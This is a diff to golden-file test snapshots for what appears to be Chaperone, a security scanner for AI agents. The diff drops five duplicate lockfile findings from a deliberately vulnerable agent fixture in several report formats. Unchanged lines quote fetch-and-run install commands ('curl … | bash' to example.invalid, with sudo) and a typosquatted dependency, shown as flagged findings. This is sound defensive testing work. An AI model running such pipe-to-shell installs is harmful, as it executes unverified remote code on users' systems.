@@ -338,7 +338,7 @@ HIGH (20)
     OWASP: General
     Remediation: Require a strong, randomly-generated token for the gateway control API and rotate any default value.
 
-MEDIUM (18)
+MEDIUM (13)
 
   [CHAP-SEC-003] Overly permissive file permissions
     The config file is readable by group or other (mode 644), so other local users/processes can read any secrets it holds.
@@ -371,38 +371,8 @@ MEDIUM (18)
     Remediation: Allowlist the specific destination domain(s) this skill needs and log outbound calls.
 
   [CHAP-SUP-002] No integrity verification for skill dependencies
-    Skill 'command-relay' declares dependencies but has no lockfile, so installs aren't hash-verified or reproducible.
-    Location: <TARGET_ROOT>/skills/command-relay/package.json (command-relay)
-    OWASP: LLM05: Supply Chain
-    Remediation: Commit a lockfile (package-lock.json/yarn.lock/pnpm-lock.yaml) alongside the manifest and enable integrity checks.
-
-  [CHAP-SUP-002] No integrity verification for skill dependencies
-    Skill 'file-writer' declares dependencies but has no lockfile, so installs aren't hash-verified or reproducible.
-    Location: <TARGET_ROOT>/skills/file-writer/package.json (file-writer)
-    OWASP: LLM05: Supply Chain
-    Remediation: Commit a lockfile (package-lock.json/yarn.lock/pnpm-lock.yaml) alongside the manifest and enable integrity checks.
-
-  [CHAP-SUP-002] No integrity verification for skill dependencies
     Skill 'plugin-loader' declares dependencies but has no lockfile, so installs aren't hash-verified or reproducible.
     Location: <TARGET_ROOT>/skills/plugin-loader/package.json (plugin-loader)
-    OWASP: LLM05: Supply Chain
-    Remediation: Commit a lockfile (package-lock.json/yarn.lock/pnpm-lock.yaml) alongside the manifest and enable integrity checks.
-
-  [CHAP-SUP-002] No integrity verification for skill dependencies
-    Skill 'py-cache-cleaner' declares dependencies but has no lockfile, so installs aren't hash-verified or reproducible.
-    Location: <TARGET_ROOT>/skills/py-cache-cleaner/package.json (py-cache-cleaner)
-    OWASP: LLM05: Supply Chain
-    Remediation: Commit a lockfile (package-lock.json/yarn.lock/pnpm-lock.yaml) alongside the manifest and enable integrity checks.
-
-  [CHAP-SUP-002] No integrity verification for skill dependencies
-    Skill 'shell-runner' declares dependencies but has no lockfile, so installs aren't hash-verified or reproducible.
-    Location: <TARGET_ROOT>/skills/shell-runner/package.json (shell-runner)
-    OWASP: LLM05: Supply Chain
-    Remediation: Commit a lockfile (package-lock.json/yarn.lock/pnpm-lock.yaml) alongside the manifest and enable integrity checks.
-
-  [CHAP-SUP-002] No integrity verification for skill dependencies
-    Skill 'web-fetcher' declares dependencies but has no lockfile, so installs aren't hash-verified or reproducible.
-    Location: <TARGET_ROOT>/skills/web-fetcher/package.json (web-fetcher)
     OWASP: LLM05: Supply Chain
     Remediation: Commit a lockfile (package-lock.json/yarn.lock/pnpm-lock.yaml) alongside the manifest and enable integrity checks.
 
@@ -457,7 +427,7 @@ LOW (1)
     Remediation: Document a kill switch (how to stop the agent) and a script or checklist to revoke/rotate its credentials.
 
 
-Summary: 44 findings (5 critical, 20 high, 18 medium, 1 low, 0 info) — posture score 0/100 (F)
+Summary: 39 findings (5 critical, 20 high, 13 medium, 1 low, 0 info) — posture score 0/100 (F)
 Inspected 18 paths, skipped 0."
 `;
 
@@ -484,12 +454,7 @@ exports[`reporter output — golden-file snapshots (improvement_plan.md 5.1) > v
 ::error file=<TARGET_ROOT>/skills/py-cache-cleaner/package.json,title=CHAP-SUP-001%3A Skill from an unverified source::Skill 'py-cache-cleaner' is not installed at a pinned version/commit (unpinned).
 ::error file=<TARGET_ROOT>/skills/shell-runner/package.json,title=CHAP-SUP-001%3A Skill from an unverified source::Skill 'shell-runner' is not installed at a pinned version/commit (unpinned).
 ::error file=<TARGET_ROOT>/skills/web-fetcher/package.json,title=CHAP-SUP-001%3A Skill from an unverified source::Skill 'web-fetcher' is not installed at a pinned version/commit (unpinned).
-::warning file=<TARGET_ROOT>/skills/command-relay/package.json,title=CHAP-SUP-002%3A No integrity verification for skill dependencies::Skill 'command-relay' declares dependencies but has no lockfile, so installs aren't hash-verified or reproducible.
-::warning file=<TARGET_ROOT>/skills/file-writer/package.json,title=CHAP-SUP-002%3A No integrity verification for skill dependencies::Skill 'file-writer' declares dependencies but has no lockfile, so installs aren't hash-verified or reproducible.
 ::warning file=<TARGET_ROOT>/skills/plugin-loader/package.json,title=CHAP-SUP-002%3A No integrity verification for skill dependencies::Skill 'plugin-loader' declares dependencies but has no lockfile, so installs aren't hash-verified or reproducible.
-::warning file=<TARGET_ROOT>/skills/py-cache-cleaner/package.json,title=CHAP-SUP-002%3A No integrity verification for skill dependencies::Skill 'py-cache-cleaner' declares dependencies but has no lockfile, so installs aren't hash-verified or reproducible.
-::warning file=<TARGET_ROOT>/skills/shell-runner/package.json,title=CHAP-SUP-002%3A No integrity verification for skill dependencies::Skill 'shell-runner' declares dependencies but has no lockfile, so installs aren't hash-verified or reproducible.
-::warning file=<TARGET_ROOT>/skills/web-fetcher/package.json,title=CHAP-SUP-002%3A No integrity verification for skill dependencies::Skill 'web-fetcher' declares dependencies but has no lockfile, so installs aren't hash-verified or reproducible.
 ::error file=<TARGET_ROOT>/skills/plugin-loader/package.json,title=CHAP-SUP-003%3A Known-vulnerable dependency::Skill 'plugin-loader' depends on lodash@^4.17.15 (matched as 4.17.15), which hits 6 known vulnerabilities in Chaperone's offline snapshot (GHSA-29mw-wpgm-hmr9, GHSA-35jh-r3h4-6jhm, GHSA-f23m-r3pf-42rh, GHSA-p6mc-m468-83gw, GHSA-r5fr-rjxr-66jc, GHSA-xxjr-mmjv-4gpg) — most severe: "Command Injection in lodash" (high), fixed in 4.17.21.
 ::warning file=package.json#scripts.postinstall,title=CHAP-SUP-004%3A Dangerous install pattern::Skill 'shell-runner' install script contains a dangerous pattern (curl -fsSL https://example.invalid/setup.sh | bash) in package.json#scripts.postinstall.
 ::warning file=<TARGET_ROOT>/skills/shell-runner/install.sh,title=CHAP-SUP-004%3A Dangerous install pattern::Skill 'shell-runner' install script contains a dangerous pattern (curl -fsSL https://example.invalid/bootstrap.sh | bash, sudo, apt-get install) in <TARGET_ROOT>/skills/shell-runner/install.sh.
@@ -506,7 +471,7 @@ exports[`reporter output — golden-file snapshots (improvement_plan.md 5.1) > v
 ::warning file=<TARGET_ROOT>/logs/agent.log,title=CHAP-OBS-002%3A Sensitive data in plaintext logs::Logging config does not confirm secrets/message bodies are redacted before being written to logs.
 ::notice file=<TARGET_ROOT>,title=CHAP-OBS-003%3A No documented kill switch / revocation path::No documented quick way to stop the agent and revoke its access was found at the install root.
 ::warning file=<TARGET_ROOT>/memory,title=CHAP-OBS-004%3A Persistent memory/state store exposed::The persistent memory/state store is exposed: it is readable by group or other (mode 755); it sits inside a git repository (<TARGET_ROOT>) without being covered by its .gitignore.
-::notice::Chaperone scan: 44 findings found."
+::notice::Chaperone scan: 39 findings found."
 `;
 
 exports[`reporter output — golden-file snapshots (improvement_plan.md 5.1) > vulnerable-agent > matches the golden html output 1`] = `
@@ -541,7 +506,7 @@ Scanned at <TIMESTAMP> — chaperone v0.1.0</p>
 
 <div class="summary">
   <div class="score">Posture score: 0/100 (F)</div>
-  <div>44 findings — 5 critical, 20 high, 18 medium, 1 low, 0 info</div>
+  <div>39 findings — 5 critical, 20 high, 13 medium, 1 low, 0 info</div>
   <div>Inspected 18 paths, skipped 0.</div>
 </div>
 <section class="severity-group severity-critical">
@@ -726,7 +691,7 @@ Scanned at <TIMESTAMP> — chaperone v0.1.0</p>
 </article>
 </section>
 <section class="severity-group severity-medium">
-  <h2 style="color: #b45309">Medium (18)</h2>
+  <h2 style="color: #b45309">Medium (13)</h2>
   <article class="finding" style="border-left-color: #b45309">
   <h3><span class="check-id">CHAP-SEC-003</span> Overly permissive file permissions</h3>
   <p class="message">The config file is readable by group or other (mode 644), so other local users/processes can read any secrets it holds.</p>
@@ -764,43 +729,8 @@ Scanned at <TIMESTAMP> — chaperone v0.1.0</p>
 </article>
 <article class="finding" style="border-left-color: #b45309">
   <h3><span class="check-id">CHAP-SUP-002</span> No integrity verification for skill dependencies</h3>
-  <p class="message">Skill &#39;command-relay&#39; declares dependencies but has no lockfile, so installs aren&#39;t hash-verified or reproducible.</p>
-  <p class="location"><strong>Location:</strong> <TARGET_ROOT>/skills/command-relay/package.json (command-relay)</p>
-  <p class="owasp"><strong>OWASP:</strong> LLM05: Supply Chain</p>
-  <p class="remediation"><strong>Remediation:</strong> Commit a lockfile (package-lock.json/yarn.lock/pnpm-lock.yaml) alongside the manifest and enable integrity checks.</p>
-</article>
-<article class="finding" style="border-left-color: #b45309">
-  <h3><span class="check-id">CHAP-SUP-002</span> No integrity verification for skill dependencies</h3>
-  <p class="message">Skill &#39;file-writer&#39; declares dependencies but has no lockfile, so installs aren&#39;t hash-verified or reproducible.</p>
-  <p class="location"><strong>Location:</strong> <TARGET_ROOT>/skills/file-writer/package.json (file-writer)</p>
-  <p class="owasp"><strong>OWASP:</strong> LLM05: Supply Chain</p>
-  <p class="remediation"><strong>Remediation:</strong> Commit a lockfile (package-lock.json/yarn.lock/pnpm-lock.yaml) alongside the manifest and enable integrity checks.</p>
-</article>
-<article class="finding" style="border-left-color: #b45309">
-  <h3><span class="check-id">CHAP-SUP-002</span> No integrity verification for skill dependencies</h3>
   <p class="message">Skill &#39;plugin-loader&#39; declares dependencies but has no lockfile, so installs aren&#39;t hash-verified or reproducible.</p>
   <p class="location"><strong>Location:</strong> <TARGET_ROOT>/skills/plugin-loader/package.json (plugin-loader)</p>
-  <p class="owasp"><strong>OWASP:</strong> LLM05: Supply Chain</p>
-  <p class="remediation"><strong>Remediation:</strong> Commit a lockfile (package-lock.json/yarn.lock/pnpm-lock.yaml) alongside the manifest and enable integrity checks.</p>
-</article>
-<article class="finding" style="border-left-color: #b45309">
-  <h3><span class="check-id">CHAP-SUP-002</span> No integrity verification for skill dependencies</h3>
-  <p class="message">Skill &#39;py-cache-cleaner&#39; declares dependencies but has no lockfile, so installs aren&#39;t hash-verified or reproducible.</p>
-  <p class="location"><strong>Location:</strong> <TARGET_ROOT>/skills/py-cache-cleaner/package.json (py-cache-cleaner)</p>
-  <p class="owasp"><strong>OWASP:</strong> LLM05: Supply Chain</p>
-  <p class="remediation"><strong>Remediation:</strong> Commit a lockfile (package-lock.json/yarn.lock/pnpm-lock.yaml) alongside the manifest and enable integrity checks.</p>
-</article>
-<article class="finding" style="border-left-color: #b45309">
-  <h3><span class="check-id">CHAP-SUP-002</span> No integrity verification for skill dependencies</h3>
-  <p class="message">Skill &#39;shell-runner&#39; declares dependencies but has no lockfile, so installs aren&#39;t hash-verified or reproducible.</p>
-  <p class="location"><strong>Location:</strong> <TARGET_ROOT>/skills/shell-runner/package.json (shell-runner)</p>
-  <p class="owasp"><strong>OWASP:</strong> LLM05: Supply Chain</p>
-  <p class="remediation"><strong>Remediation:</strong> Commit a lockfile (package-lock.json/yarn.lock/pnpm-lock.yaml) alongside the manifest and enable integrity checks.</p>
-</article>
-<article class="finding" style="border-left-color: #b45309">
-  <h3><span class="check-id">CHAP-SUP-002</span> No integrity verification for skill dependencies</h3>
-  <p class="message">Skill &#39;web-fetcher&#39; declares dependencies but has no lockfile, so installs aren&#39;t hash-verified or reproducible.</p>
-  <p class="location"><strong>Location:</strong> <TARGET_ROOT>/skills/web-fetcher/package.json (web-fetcher)</p>
   <p class="owasp"><strong>OWASP:</strong> LLM05: Supply Chain</p>
   <p class="remediation"><strong>Remediation:</strong> Commit a lockfile (package-lock.json/yarn.lock/pnpm-lock.yaml) alongside the manifest and enable integrity checks.</p>
 </article>
@@ -880,11 +810,11 @@ exports[`reporter output — golden-file snapshots (improvement_plan.md 5.1) > v
   "targetRootResolved": true,
   "timestamp": "<TIMESTAMP>",
   "summary": {
-    "totalFindings": 44,
+    "totalFindings": 39,
     "bySeverity": {
       "critical": 5,
       "high": 20,
-      "medium": 18,
+      "medium": 13,
       "low": 1,
       "info": 0
     },
@@ -1206,81 +1136,11 @@ exports[`reporter output — golden-file snapshots (improvement_plan.md 5.1) > v
       "severity": "medium",
       "category": "supply-chain",
       "owasp": "LLM05: Supply Chain",
-      "message": "Skill 'command-relay' declares dependencies but has no lockfile, so installs aren't hash-verified or reproducible.",
-      "location": {
-        "filePath": "<TARGET_ROOT>/skills/command-relay/package.json",
-        "line": null,
-        "detail": "command-relay"
-      },
-      "remediation": "Commit a lockfile (package-lock.json/yarn.lock/pnpm-lock.yaml) alongside the manifest and enable integrity checks."
-    },
-    {
-      "checkId": "CHAP-SUP-002",
-      "title": "No integrity verification for skill dependencies",
-      "severity": "medium",
-      "category": "supply-chain",
-      "owasp": "LLM05: Supply Chain",
-      "message": "Skill 'file-writer' declares dependencies but has no lockfile, so installs aren't hash-verified or reproducible.",
-      "location": {
-        "filePath": "<TARGET_ROOT>/skills/file-writer/package.json",
-        "line": null,
-        "detail": "file-writer"
-      },
-      "remediation": "Commit a lockfile (package-lock.json/yarn.lock/pnpm-lock.yaml) alongside the manifest and enable integrity checks."
-    },
-    {
-      "checkId": "CHAP-SUP-002",
-      "title": "No integrity verification for skill dependencies",
-      "severity": "medium",
-      "category": "supply-chain",
-      "owasp": "LLM05: Supply Chain",
       "message": "Skill 'plugin-loader' declares dependencies but has no lockfile, so installs aren't hash-verified or reproducible.",
       "location": {
         "filePath": "<TARGET_ROOT>/skills/plugin-loader/package.json",
         "line": null,
         "detail": "plugin-loader"
-      },
-      "remediation": "Commit a lockfile (package-lock.json/yarn.lock/pnpm-lock.yaml) alongside the manifest and enable integrity checks."
-    },
-    {
-      "checkId": "CHAP-SUP-002",
-      "title": "No integrity verification for skill dependencies",
-      "severity": "medium",
-      "category": "supply-chain",
-      "owasp": "LLM05: Supply Chain",
-      "message": "Skill 'py-cache-cleaner' declares dependencies but has no lockfile, so installs aren't hash-verified or reproducible.",
-      "location": {
-        "filePath": "<TARGET_ROOT>/skills/py-cache-cleaner/package.json",
-        "line": null,
-        "detail": "py-cache-cleaner"
-      },
-      "remediation": "Commit a lockfile (package-lock.json/yarn.lock/pnpm-lock.yaml) alongside the manifest and enable integrity checks."
-    },
-    {
-      "checkId": "CHAP-SUP-002",
-      "title": "No integrity verification for skill dependencies",
-      "severity": "medium",
-      "category": "supply-chain",
-      "owasp": "LLM05: Supply Chain",
-      "message": "Skill 'shell-runner' declares dependencies but has no lockfile, so installs aren't hash-verified or reproducible.",
-      "location": {
-        "filePath": "<TARGET_ROOT>/skills/shell-runner/package.json",
-        "line": null,
-        "detail": "shell-runner"
-      },
-      "remediation": "Commit a lockfile (package-lock.json/yarn.lock/pnpm-lock.yaml) alongside the manifest and enable integrity checks."
-    },
-    {
-      "checkId": "CHAP-SUP-002",
-      "title": "No integrity verification for skill dependencies",
-      "severity": "medium",
-      "category": "supply-chain",
-      "owasp": "LLM05: Supply Chain",
-      "message": "Skill 'web-fetcher' declares dependencies but has no lockfile, so installs aren't hash-verified or reproducible.",
-      "location": {
-        "filePath": "<TARGET_ROOT>/skills/web-fetcher/package.json",
-        "line": null,
-        "detail": "web-fetcher"
       },
       "remediation": "Commit a lockfile (package-lock.json/yarn.lock/pnpm-lock.yaml) alongside the manifest and enable integrity checks."
     },
@@ -1625,12 +1485,7 @@ exports[`reporter output — golden-file snapshots (improvement_plan.md 5.1) > v
 | Medium | \`CHAP-AGY-004\` | Skill 'command-relay' can call arbitrary external endpoints — no domain allowlist is declared. | <TARGET_ROOT>/skills/command-relay/package.json (command-relay) |
 | Medium | \`CHAP-AGY-004\` | Skill 'plugin-loader' can call arbitrary external endpoints — no domain allowlist is declared. | <TARGET_ROOT>/skills/plugin-loader/package.json (plugin-loader) |
 | Medium | \`CHAP-AGY-004\` | Skill 'web-fetcher' can call arbitrary external endpoints — no domain allowlist is declared. | <TARGET_ROOT>/skills/web-fetcher/package.json (web-fetcher) |
-| Medium | \`CHAP-SUP-002\` | Skill 'command-relay' declares dependencies but has no lockfile, so installs aren't hash-verified or reproducible. | <TARGET_ROOT>/skills/command-relay/package.json (command-relay) |
-| Medium | \`CHAP-SUP-002\` | Skill 'file-writer' declares dependencies but has no lockfile, so installs aren't hash-verified or reproducible. | <TARGET_ROOT>/skills/file-writer/package.json (file-writer) |
 | Medium | \`CHAP-SUP-002\` | Skill 'plugin-loader' declares dependencies but has no lockfile, so installs aren't hash-verified or reproducible. | <TARGET_ROOT>/skills/plugin-loader/package.json (plugin-loader) |
-| Medium | \`CHAP-SUP-002\` | Skill 'py-cache-cleaner' declares dependencies but has no lockfile, so installs aren't hash-verified or reproducible. | <TARGET_ROOT>/skills/py-cache-cleaner/package.json (py-cache-cleaner) |
-| Medium | \`CHAP-SUP-002\` | Skill 'shell-runner' declares dependencies but has no lockfile, so installs aren't hash-verified or reproducible. | <TARGET_ROOT>/skills/shell-runner/package.json (shell-runner) |
-| Medium | \`CHAP-SUP-002\` | Skill 'web-fetcher' declares dependencies but has no lockfile, so installs aren't hash-verified or reproducible. | <TARGET_ROOT>/skills/web-fetcher/package.json (web-fetcher) |
 | Medium | \`CHAP-SUP-004\` | Skill 'shell-runner' install script contains a dangerous pattern (curl -fsSL https://example.invalid/setup.sh \\| bash) in package.json#scripts.postinstall. | package.json#scripts.postinstall (shell-runner) |
 | Medium | \`CHAP-SUP-004\` | Skill 'shell-runner' install script contains a dangerous pattern (curl -fsSL https://example.invalid/bootstrap.sh \\| bash, sudo, apt-get install) in <TARGET_ROOT>/skills/shell-runner/install.sh. | <TARGET_ROOT>/skills/shell-runner/install.sh (shell-runner) |
 | Medium | \`CHAP-SUP-006\` | Skill 'plugin-loader' depends on 'reqeust', which is suspiciously close to the well-known package 'request' — possible typosquat. | <TARGET_ROOT>/skills/plugin-loader/package.json (reqeust) |
@@ -1640,7 +1495,7 @@ exports[`reporter output — golden-file snapshots (improvement_plan.md 5.1) > v
 | Medium | \`CHAP-OBS-004\` | The persistent memory/state store is exposed: it is readable by group or other (mode 755); it sits inside a git repository (<TARGET_ROOT>) without being covered by its .gitignore. | <TARGET_ROOT>/memory (memory_dir) |
 | Low | \`CHAP-OBS-003\` | No documented quick way to stop the agent and revoke its access was found at the install root. | <TARGET_ROOT> (KILL_SWITCH.md / STOP.md / kill-switch.sh / revoke.sh) |
 
-**Summary:** 44 findings (5 critical, 20 high, 18 medium, 1 low, 0 info) — posture score 0/100 (F)
+**Summary:** 39 findings (5 critical, 20 high, 13 medium, 1 low, 0 info) — posture score 0/100 (F)
 Inspected 18 paths, skipped 0."
 `;
 
@@ -2559,50 +2414,6 @@ exports[`reporter output — golden-file snapshots (improvement_plan.md 5.1) > v
           "ruleId": "CHAP-SUP-002",
           "level": "warning",
           "message": {
-            "text": "Skill 'command-relay' declares dependencies but has no lockfile, so installs aren't hash-verified or reproducible."
-          },
-          "properties": {
-            "severity": "medium",
-            "category": "supply-chain",
-            "owasp": "LLM05: Supply Chain",
-            "remediation": "Commit a lockfile (package-lock.json/yarn.lock/pnpm-lock.yaml) alongside the manifest and enable integrity checks."
-          },
-          "locations": [
-            {
-              "physicalLocation": {
-                "artifactLocation": {
-                  "uri": "file://<TARGET_ROOT>/skills/command-relay/package.json"
-                }
-              }
-            }
-          ]
-        },
-        {
-          "ruleId": "CHAP-SUP-002",
-          "level": "warning",
-          "message": {
-            "text": "Skill 'file-writer' declares dependencies but has no lockfile, so installs aren't hash-verified or reproducible."
-          },
-          "properties": {
-            "severity": "medium",
-            "category": "supply-chain",
-            "owasp": "LLM05: Supply Chain",
-            "remediation": "Commit a lockfile (package-lock.json/yarn.lock/pnpm-lock.yaml) alongside the manifest and enable integrity checks."
-          },
-          "locations": [
-            {
-              "physicalLocation": {
-                "artifactLocation": {
-                  "uri": "file://<TARGET_ROOT>/skills/file-writer/package.json"
-                }
-              }
-            }
-          ]
-        },
-        {
-          "ruleId": "CHAP-SUP-002",
-          "level": "warning",
-          "message": {
             "text": "Skill 'plugin-loader' declares dependencies but has no lockfile, so installs aren't hash-verified or reproducible."
           },
           "properties": {
@@ -2616,72 +2427,6 @@ exports[`reporter output — golden-file snapshots (improvement_plan.md 5.1) > v
               "physicalLocation": {
                 "artifactLocation": {
                   "uri": "file://<TARGET_ROOT>/skills/plugin-loader/package.json"
-                }
-              }
-            }
-          ]
-        },
-        {
-          "ruleId": "CHAP-SUP-002",
-          "level": "warning",
-          "message": {
-            "text": "Skill 'py-cache-cleaner' declares dependencies but has no lockfile, so installs aren't hash-verified or reproducible."
-          },
-          "properties": {
-            "severity": "medium",
-            "category": "supply-chain",
-            "owasp": "LLM05: Supply Chain",
-            "remediation": "Commit a lockfile (package-lock.json/yarn.lock/pnpm-lock.yaml) alongside the manifest and enable integrity checks."
-          },
-          "locations": [
-            {
-              "physicalLocation": {
-                "artifactLocation": {
-                  "uri": "file://<TARGET_ROOT>/skills/py-cache-cleaner/package.json"
-                }
-              }
-            }
-          ]
-        },
-        {
-          "ruleId": "CHAP-SUP-002",
-          "level": "warning",
-          "message": {
-            "text": "Skill 'shell-runner' declares dependencies but has no lockfile, so installs aren't hash-verified or reproducible."
-          },
-          "properties": {
-            "severity": "medium",
-            "category": "supply-chain",
-            "owasp": "LLM05: Supply Chain",
-            "remediation": "Commit a lockfile (package-lock.json/yarn.lock/pnpm-lock.yaml) alongside the manifest and enable integrity checks."
-          },
-          "locations": [
-            {
-              "physicalLocation": {
-                "artifactLocation": {
-                  "uri": "file://<TARGET_ROOT>/skills/shell-runner/package.json"
-                }
-              }
-            }
-          ]
-        },
-        {
-          "ruleId": "CHAP-SUP-002",
-          "level": "warning",
-          "message": {
-            "text": "Skill 'web-fetcher' declares dependencies but has no lockfile, so installs aren't hash-verified or reproducible."
-          },
-          "properties": {
-            "severity": "medium",
-            "category": "supply-chain",
-            "owasp": "LLM05: Supply Chain",
-            "remediation": "Commit a lockfile (package-lock.json/yarn.lock/pnpm-lock.yaml) alongside the manifest and enable integrity checks."
-          },
-          "locations": [
-            {
-              "physicalLocation": {
-                "artifactLocation": {
-                  "uri": "file://<TARGET_ROOT>/skills/web-fetcher/package.json"
                 }
               }
             }
